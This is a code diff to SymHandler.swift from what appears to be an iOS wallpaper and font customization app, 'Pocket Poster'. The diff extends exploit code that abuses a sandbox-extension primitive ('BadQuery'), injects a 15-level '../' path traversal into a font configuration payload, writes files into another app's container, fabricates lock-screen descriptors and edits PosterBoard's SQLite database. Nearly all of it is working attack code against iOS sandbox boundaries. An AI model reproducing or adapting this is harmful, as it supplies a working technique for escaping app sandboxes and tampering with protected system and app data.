@@ -1,4 +1,4 @@
-//
+﻿//
 //  SymHandler.swift
 //  Pocket Poster
 //
@@ -3792,7 +3792,7 @@ class SymHandler {
         } catch {
             if let cached = UserDefaults.standard.string(forKey: uuidKey) {
                 uuid = cached
-                diag.append("PB hash detection failed (\(error)) — using cached uuid")
+                diag.append("PB hash detection failed (\(error)) -- using cached uuid")
             } else {
                 diag.append("PB hash: \(error)"); return pbSave(diag)
             }
@@ -3800,9 +3800,6 @@ class SymHandler {
         let container = BadQuery.applicationContainerPath(appHash: uuid)
         diag.append("PB container uuid: \(uuid)")
 
-        // Write a probe font marker file into PB container Caches via bad_query.
-        // CGFontCreateFontsWithURL will try to open+parse this file.
-        // Invalid content → returns nil/empty → no visual change, but FILE OPEN confirms traversal.
         let cacheDir = container + "/Library/Caches"
         let fontFileName = "pp_probe_font13.otf"
         let fontFilePath = "\(cacheDir)/\(fontFileName)"
@@ -3814,10 +3811,8 @@ class SymHandler {
             fontWriteOK = fm.createFile(atPath: fontFilePath, contents: probeMarker, attributes: nil)
                 || ((try? probeMarker.write(to: URL(fileURLWithPath: fontFilePath))) != nil)
         }
-        diag.append("probe font → PB Caches: \(fontWriteOK ? "OK \(fontFilePath)" : "FAIL")")
+        diag.append("probe font -> PB Caches: \(fontWriteOK ? "OK \(fontFilePath)" : "FAIL")")
 
-        // Build traversal path: 15x "../" escapes to root from any extension bundle depth.
-        // Then absolute path from root to PB container probe font.
         let traversalPrefix = String(repeating: "../", count: 15)
         let pbFontPath = traversalPrefix
             + "var/mobile/Containers/Data/Application/\(uuid)/Library/Caches/\(fontFileName)"
@@ -3826,14 +3821,7 @@ class SymHandler {
         _PP13CustomFontConfigProxy.extensionBundleRelativeFilePath = pbFontPath
         let payload13 = payloadTitleStyleCustomFont13
         diag.append("payload13 (PB-container probe): \(payload13.count)b")
-        diag.append("  fontPostScriptName: pp-probe-13")
-        diag.append("  extensionBundleRelativeFilePath: \(pbFontPath.prefix(120))...")
 
-        // All system fonts are under /System/Library/Fonts/Core/ on this device (confirmed via
-        // opendir enumeration — previous attempts all targeted the wrong path without /Core/).
-        // DINAlternate-Bold: target font. PS name confirmed from CoreText metadata.
-        // Filename confirmed lowercase-b via opendir enumeration on device.
-        // If font still doesn't change after respring, try capital-B: "DINAlternate-Bold.ttf".
         let canaryPS  = "DINAlternate-Bold"
         let canaryRel = "System/Library/Fonts/Core/DINAlternate-bold.ttf"
         _PP13CustomFontConfigProxy.fontPostScriptName = canaryPS
@@ -3849,73 +3837,152 @@ class SymHandler {
         defer { extBaseH.release() }
         let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
 
+        // Only ClockPoster can trigger effectiveTimeFontWithExtensionBundleURL:
+        guard let clockExtName = allExts.first(where: { $0.contains("ClockPoster") }) else {
+            diag.append("No ClockPoster extension in Extensions/"); return pbSave(diag)
+        }
+        diag.append("clockExt: \(clockExtName)")
+
+        // iOS 26 uses "descriptors/" -- prior iOS used "configurations"/"staticdescriptors"
+        let descriptorsPath = "\(extBase)/\(clockExtName)/descriptors"
+        guard let descH = try? BadQuery.consume(path: descriptorsPath, create: false) else {
+            diag.append("ClockPoster descriptors/ NOACCESS"); return pbSave(diag)
+        }
+        defer { descH.release() }
+
+        let allUUIDs = ((try? fm.contentsOfDirectory(atPath: descriptorsPath)) ?? [])
+            .filter { $0.count == 36 && $0.contains("-") }
+        diag.append("ClockPoster UUID descriptors: \(allUUIDs.count)")
+
         var totalWritten = 0
-        for extName in allExts where !extName.hasPrefix(".") {
-            let isWK    = extName.contains("WallpaperKit")
-            let isClock = extName.contains("ClockPoster")
-            guard isWK || isClock else { continue }
+        var firstLockScreenUUID: String? = nil
 
-            for subdir in ["configurations", "staticdescriptors"] {
-                let sdPath = "\(extBase)/\(extName)/\(subdir)"
-                // create:false — path was just listed; lstat confirms existence before requesting extension;
-                // BadQuery.swift auto-retries with create:true if lstat fails (path unexpectedly missing)
-                guard let sdH = try? BadQuery.consume(path: sdPath, create: false) else { continue }
-                defer { sdH.release() }
-                let configs = (try? fm.contentsOfDirectory(atPath: sdPath)) ?? []
-                for cfg in configs where !cfg.hasPrefix(".") {
-                    let versPath = "\(sdPath)/\(cfg)/versions"
-                    guard let versH = try? BadQuery.consume(path: versPath, create: false) else { continue }
-                    defer { versH.release() }
-                    let vers = (try? fm.contentsOfDirectory(atPath: versPath)) ?? []
-                    for ver in vers where !ver.hasPrefix(".") {
-                        let vPath = "\(versPath)/\(ver)"
-                        guard let vH = try? BadQuery.consume(path: vPath, create: false) else { continue }
-                        defer { vH.release() }
+        for cfg in allUUIDs {
+            let cfgPath = "\(descriptorsPath)/\(cfg)"
 
-                        for contentSubdir in ["", "contents"] {
-                            let base = contentSubdir.isEmpty ? vPath : "\(vPath)/\(contentSubdir)"
-                            if !contentSubdir.isEmpty {
-                                guard let cH = try? BadQuery.consume(path: base, create: false) else { continue }
-                                defer { cH.release() }
-                            }
-                            _ = (try? fm.contentsOfDirectory(atPath: base)) ?? []
-                            let dirLabel = contentSubdir.isEmpty ? "vDir" : "contents"
-                            let titlePath = "\(base)/com.apple.posterkit.provider.instance.titleStyleConfiguration.plist"
-                            // Dump existing plist before overwrite
-                            if let existing = fm.contents(atPath: titlePath), existing.count > 8 {
-                                diag.append("  existing(\(existing.count)b):")
-                                p7DumpNSKAKeys(data: existing, indent: "    ", diag: &diag)
-                            }
-                            // keep fH alive across the write — overwriting an existing file
-                            // needs the file-specific extension active (dir extension alone is
-                            // insufficient for O_WRONLY on an existing inode)
-                            let fH = try? BadQuery.consume(path: titlePath, create: true)
-                            defer { fH?.release() }
-                            diag.append("  fH: \(fH != nil ? "ok" : "nil")")
-                            let ok = fm.createFile(atPath: titlePath, contents: payload13sys, attributes: nil)
-                                || ((try? payload13sys.write(to: URL(fileURLWithPath: titlePath))) != nil)
-                            diag.append("\(extName.prefix(18))/\(subdir.prefix(6))/v\(ver)/\(dirLabel)/titleStyle[sys]: \(ok ? "WRITTEN" : "FAIL")")
-                            if ok { totalWritten += 1 }
-                        }
+            let rolePath = "\(cfgPath)/com.apple.posterkit.role.identifier"
+            if let rH = try? BadQuery.consume(path: rolePath, create: false) { rH.release() }
+            let role = (try? String(contentsOfFile: rolePath, encoding: .utf8))?
+                .trimmingCharacters(in: .whitespacesAndNewlines) ?? "?"
+            let isLS = role.contains("LockScreen")
+            diag.append("  \(cfg.prefix(8)) role=\(role) ls=\(isLS)")
+            if isLS && firstLockScreenUUID == nil { firstLockScreenUUID = cfg }
+
+            let versPath = "\(cfgPath)/versions"
+            guard let versH = try? BadQuery.consume(path: versPath, create: false) else {
+                diag.append("  \(cfg.prefix(8)) versions NOACCESS"); continue
+            }
+            defer { versH.release() }
+            var vers = ((try? fm.contentsOfDirectory(atPath: versPath)) ?? []).filter { !$0.hasPrefix(".") }
+
+            // iOS 26 versions/ is empty for existing ClockPoster descriptors -- create "1"
+            if vers.isEmpty {
+                let ver1 = "\(versPath)/1"
+                if let v1H = try? BadQuery.consume(path: ver1, create: true) {
+                    v1H.release()
+                    try? fm.createDirectory(atPath: ver1, withIntermediateDirectories: true, attributes: nil)
+                    vers = ["1"]
+                    diag.append("    \(cfg.prefix(8)) created versions/1")
+                }
+            }
+
+            for ver in vers where !ver.hasPrefix(".") {
+                let vPath = "\(versPath)/\(ver)"
+                guard let vH = try? BadQuery.consume(path: vPath, create: false) else { continue }
+                defer { vH.release() }
+
+                for contentSubdir in ["", "contents"] {
+                    let base = contentSubdir.isEmpty ? vPath : "\(vPath)/\(contentSubdir)"
+                    if !contentSubdir.isEmpty {
+                        guard let cH = try? BadQuery.consume(path: base, create: false) else { continue }
+                        defer { cH.release() }
                     }
+                    let dirLabel = contentSubdir.isEmpty ? "vDir" : "contents"
+                    let titlePath = "\(base)/com.apple.posterkit.provider.instance.titleStyleConfiguration.plist"
+                    if let existing = fm.contents(atPath: titlePath), existing.count > 8 {
+                        diag.append("  existing(\(existing.count)b):")
+                        p7DumpNSKAKeys(data: existing, indent: "    ", diag: &diag)
+                    }
+                    let fH = try? BadQuery.consume(path: titlePath, create: true)
+                    defer { fH?.release() }
+                    let ok = fm.createFile(atPath: titlePath, contents: payload13sys, attributes: nil)
+                        || ((try? payload13sys.write(to: URL(fileURLWithPath: titlePath))) != nil)
+                    diag.append("\(cfg.prefix(8))/v\(ver)/\(dirLabel)/titleStyle: \(ok ? "WRITTEN" : "FAIL")")
+                    if ok { totalWritten += 1 }
                 }
             }
         }
 
-        diag.append("\ntotal written: \(totalWritten)")
-        diag.append("payload13sys path: \(traversalPrefix + canaryRel)")
+        // If all existing descriptors are PRPosterRoleAmbient (Astronomy AOD only),
+        // synthesize a minimal PRPosterRoleLockScreen descriptor from scratch.
+        if firstLockScreenUUID == nil {
+            diag.append("All descriptors are Ambient -- synthesizing PRPosterRoleLockScreen")
+            let newUUID = UUID().uuidString
+            let newPath = "\(descriptorsPath)/\(newUUID)"
+            if let nH = try? BadQuery.consume(path: newPath, create: true) {
+                nH.release()
+                try? fm.createDirectory(atPath: newPath, withIntermediateDirectories: true, attributes: nil)
+                let roleFile = "\(newPath)/com.apple.posterkit.role.identifier"
+                if let rH = try? BadQuery.consume(path: roleFile, create: true) { rH.release() }
+                fm.createFile(atPath: roleFile,
+                              contents: "PRPosterRoleLockScreen".data(using: .utf8), attributes: nil)
+                let idFile = "\(newPath)/com.apple.posterkit.provider.descriptor.identifier"
+                if let iH = try? BadQuery.consume(path: idFile, create: true) { iH.release() }
+                fm.createFile(atPath: idFile,
+                              contents: "pp-inject13-ls".data(using: .utf8), attributes: nil)
+                let provFile = "\(newPath)/providerInfo.plist"
+                if let pH = try? BadQuery.consume(path: provFile, create: true) { pH.release() }
+                if let provData = try? NSKeyedArchiver.archivedData(
+                    withRootObject: NSDictionary(), requiringSecureCoding: false) {
+                    fm.createFile(atPath: provFile, contents: provData, attributes: nil)
+                }
+                let ver1 = "\(newPath)/versions/1"
+                if let v1H = try? BadQuery.consume(path: ver1, create: true) { v1H.release() }
+                try? fm.createDirectory(atPath: ver1, withIntermediateDirectories: true, attributes: nil)
+                let titlePath = "\(ver1)/com.apple.posterkit.provider.instance.titleStyleConfiguration.plist"
+                if let fH = try? BadQuery.consume(path: titlePath, create: true) { fH.release() }
+                let ok = fm.createFile(atPath: titlePath, contents: payload13sys, attributes: nil)
+                diag.append("synthesized \(newUUID.prefix(8)) titleStyle: \(ok ? "WRITTEN" : "FAIL")")
+                if ok { totalWritten += 1; firstLockScreenUUID = newUUID }
+            }
+        }
 
-        // PRPosterPathModelObjectCache -titleStyleConfiguration is a write-once cache (confirmed
-        // from PosterKit disasm). Once _titleStyleConfigurationLoadError or _titleStyleConfiguration
-        // is set in the posterboardd process, the method never re-reads from disk — no invalidation
-        // path exists. A respring is required if posterboardd already loaded (or failed to load)
-        // this plist in the current boot. Posting UnarchiveConfigurationStore may trigger a reload
-        // if posterboardd listens to it and re-creates its PRPosterPathModelObjectCache instances.
+        // Activate the ClockPoster lock-screen descriptor by updating the SQLite DB.
+        // posterboardd queries poster WHERE pid=1 to determine which poster to render.
+        if let clockUUID = firstLockScreenUUID {
+            let dbPath = container
+                + "/Library/Application Support/PRBPosterExtensionDataStore/PBFPosterExtensionDataStoreSQLiteDatabase.sqlite3"
+            if let dbH = try? BadQuery.consume(path: dbPath, create: false) {
+                dbH.release()
+                var db: OpaquePointer?
+                if sqlite3_open(dbPath, &db) == SQLITE_OK {
+                    let sql = "UPDATE poster SET uuid = '\(clockUUID)', prov = 'com.apple.ClockPoster.ClockPosterExtension' WHERE pid = 1;"
+                    var errMsg: UnsafeMutablePointer<CChar>? = nil
+                    let rc = sqlite3_exec(db, sql, nil, nil, &errMsg)
+                    if rc == SQLITE_OK {
+                        diag.append("SQLite: activated ClockPoster \(clockUUID.prefix(8)) -- rows=\(sqlite3_changes(db))")
+                    } else {
+                        let msg = errMsg.map { String(cString: $0) } ?? "err"
+                        diag.append("SQLite UPDATE err: rc=\(rc) \(msg)")
+                    }
+                    sqlite3_close(db)
+                } else {
+                    diag.append("SQLite: open failed")
+                }
+            } else {
+                diag.append("SQLite DB: bad_query NOACCESS")
+            }
+        } else {
+            diag.append("SQLite: no LockScreen UUID to activate")
+        }
+
+        diag.append("\ntotal written: \(totalWritten)")
+        diag.append("payload13sys traversal: \(traversalPrefix + canaryRel)")
+
+        // PRPosterPathModelObjectCache -titleStyleConfiguration is write-once -- respring required.
         let notifRet = notify_post("com.apple.PosterBoard.UnarchiveConfigurationStore")
         diag.append("notify_post(UnarchiveConfigurationStore): \(notifRet == 0 ? "OK" : "err \(notifRet)")")
-        diag.append("NOTE: if font unchanged after lock/unlock → RESPRING required (write-once cache)")
-        diag.append("NOTE: if respring+no-change → check syslog for sandboxd denial (Candidate 2)")
-        diag.append("NOTE: if respring+no-change+no-sandboxd → run inject12 first (Candidate 1: extensionBundleURL)")
+        diag.append("NOTE: respring required (write-once cache)")
         diag.append("After respring: wide bold industrial digits (DIN) = PATH TRAVERSAL CONFIRMED")
         return pbSave(diag)
     }
